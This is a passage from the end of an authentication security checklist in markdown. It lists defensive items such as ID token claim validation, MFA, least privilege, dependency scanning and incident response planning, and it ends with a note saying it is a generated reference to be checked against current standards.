- [ ] ID token claims validated: `iss`, `aud`, `exp`, `nonce`

### General

- [ ] MFA available and enforced for sensitive accounts
- [ ] Principle of least privilege applied to all identities
- [ ] Dependency vulnerabilities scanned (Dependabot, Snyk, Trivy)
- [ ] Penetration test or security audit completed before launch
- [ ] Security incident response plan documented
- [ ] Auth-related logs retained for compliance period

---

*Generated reference — always verify against current security standards (OWASP, NIST SP 800-63B, RFC documents) for your specific compliance requirements.*
